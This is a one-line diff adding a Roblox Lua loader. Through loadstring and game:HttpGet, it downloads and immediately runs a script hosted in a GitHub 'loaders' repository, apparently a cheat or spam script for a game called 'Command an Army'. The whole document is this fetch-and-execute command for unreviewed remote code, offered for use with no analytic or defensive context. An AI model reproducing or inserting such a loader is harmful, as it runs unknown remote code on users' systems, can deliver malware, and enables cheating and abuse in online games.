@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShinobiComply/loaders/main/loaders/upd-command-an-army-spam1-2bonc3qsig7ky5.lua"))()
